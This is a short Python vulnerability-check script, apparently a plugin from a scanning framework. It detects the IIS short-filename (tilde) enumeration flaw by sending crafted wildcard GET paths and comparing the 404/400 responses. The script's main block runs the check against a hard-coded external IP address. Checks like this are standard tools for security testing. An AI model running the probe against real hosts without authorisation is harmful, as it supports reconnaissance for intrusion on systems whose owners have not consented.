# -*- coding:utf-8 -*-

from exp.lib.httpparse import httpparse

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if iis shortname vul')
    http = httpparse()
    try:
        path = '/*~1****/a.aspx'
        tm = http.httpreq('GET', protocol, ip, port, path)
        print(tm[0])
        if tm and (tm != None) and tm[0] == 404:
            try:
                path = '/spurs*~1****/a.aspx'
                tmn = http.httpreq('GET', protocol, ip, port, path)
                print(tmn[0])
                if tmn and (tmn != None) and tmn[0] == 400:
                    msg = 'There is iis shortname vul on url: ' +url+ ' .'
                    number = 'v15'
                    print(msg)
                    return True,url,number,msg
                else:
                    msg = 'There is no iis shortname vul on ' +url+ ' .'
                    number = 'v0'
                    return False,url,number,msg
            except Exception as e:
                msg = str(e)
                number = 'v0'
                return False,url,number,msg
        else:
            msg = 'There is no iis shortname vul on ' +url+ ' .'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','146.196.114.106',80)
    print(res)